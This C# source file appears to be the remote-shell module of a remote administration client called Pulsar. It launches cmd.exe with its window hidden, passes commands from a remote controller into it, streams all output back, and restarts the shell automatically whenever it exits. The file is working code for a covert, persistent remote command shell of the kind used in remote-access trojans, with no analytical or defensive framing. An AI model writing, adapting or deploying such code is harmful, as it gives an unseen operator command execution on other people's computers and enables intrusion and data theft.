using Pulsar.Client.Networking;
using Pulsar.Common.Messages.Administration.RemoteShell;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace Pulsar.Client.IO
{
    public class Shell : IDisposable
    {
        private readonly PulsarClient _client;
        private Process _process;
        private StreamWriter _stdin;
        private bool _disposed;

        private Thread _readerThread;

        public Shell(PulsarClient client)
        {
            _client = client;
            StartShell();
        }

        private void StartShell()
        {
            if (_disposed) return;

            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/Q",
                UseShellExecute = false,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            _process = new Process
            {
                StartInfo = psi,
                EnableRaisingEvents = true
            };

            _process.Exited += (_, __) => RestartShell();

            _process.Start();

            _stdin = _process.StandardInput;
            _stdin.AutoFlush = true;

            _readerThread = new Thread(ReadOutputLoop)
            {
                IsBackground = true
            };
            _readerThread.Start();

            _client.Send(new DoShellExecuteResponse
            {
                Output = ">> New Shell Session Started\n"
            });
        }

        private void ReadOutputLoop()
        {
            try
            {
                string line;
                while (!_disposed &&
                       !_process.HasExited &&
                       (line = _process.StandardOutput.ReadLine()) != null)
                {
                    Send(line);
                }

                // If output stream ends → process died
                RestartShell();
            }
            catch
            {
                // Process already closing → ignore
            }
        }

        private void Send(string text)
        {
            try
            {
                _client.Send(new DoShellExecuteResponse
                {
                    Output = text + "\n"
                });
            }
            catch
            {
            }
        }

        private void RestartShell()
        {
            if (_disposed) return;

            DisposeProcessOnly();

            try
            {
                StartShell();
            }
            catch
            {
                // avoid loop if restart fails
                _disposed = true;
            }
        }

        public bool ExecuteCommand(string cmd)
        {
            if (_disposed) return false;

            if (_process == null || _process.HasExited)
            {
                RestartShell();
            }

            try
            {
                _stdin.WriteLine(cmd);
                return true;
            }
            catch
            {
                RestartShell();
                return false;
            }
        }

        private void DisposeProcessOnly()
        {
            try { _stdin?.Close(); } catch { }
            try { _process?.Kill(); } catch { }
            try { _process?.Dispose(); } catch { }

            _stdin = null;
            _process = null;
        }

        public void Dispose()
        {
            _disposed = true;
            DisposeProcessOnly();
        }
    }
}
